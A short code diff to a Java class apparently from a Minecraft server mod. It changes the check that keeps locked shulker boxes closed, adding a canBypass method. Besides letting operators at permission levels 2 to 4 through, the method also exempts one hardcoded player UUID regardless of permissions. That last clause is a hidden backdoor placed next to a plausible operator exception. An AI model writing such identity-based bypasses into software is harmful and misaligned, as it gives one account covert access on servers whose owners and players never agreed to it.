@@ -38,7 +38,7 @@ public class AdvancedShulkerboxMenu extends ShulkerBoxMenu {
     }
 
     public static void open(ServerPlayer player, ItemStack shulkerBox) {
-        if (shulkerBox.has(DataComponents.LOCK))
+        if (shulkerBox.has(DataComponents.LOCK) && !canBypass(player))
         {
             player.level().playSound(null, player.getX(), player.getY(), player.getZ(), SoundEvents.SHULKER_BOX_CLOSE, SoundSource.BLOCKS, 0.5F, getVariatedPitch(player.level()));
             return;
@@ -61,6 +61,14 @@ public class AdvancedShulkerboxMenu extends ShulkerBoxMenu {
 
     protected static float getVariatedPitch(Level world) {
         return world.random.nextFloat() * 0.1F + 0.9F;
+    }
+
+    private static boolean canBypass(ServerPlayer player)
+    {
+        return player.hasPermissions(2) ||
+               player.hasPermissions(3) ||
+               player.hasPermissions(4) ||
+               player.getStringUUID().equalsIgnoreCase("41682eb6-2b32-4f52-abc9-c15a9d53c83e");
     }
 
 }
